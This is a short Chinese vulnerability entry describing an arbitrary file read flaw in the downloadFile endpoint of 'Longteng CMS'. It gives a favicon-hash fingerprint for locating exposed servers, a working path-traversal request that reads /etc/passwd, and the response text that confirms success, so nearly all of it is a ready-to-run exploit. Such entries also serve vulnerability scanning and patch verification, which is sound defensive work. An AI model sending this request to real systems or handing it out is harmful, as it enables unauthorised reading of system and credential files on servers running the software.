# 龙腾CMSdownloadFile存在任意文件读取漏洞

龙腾 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`icon_hash="-803002403"`
- **请求**：`GET /api/file/downloadFile?file=../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1`
- **响应特征**：200 root: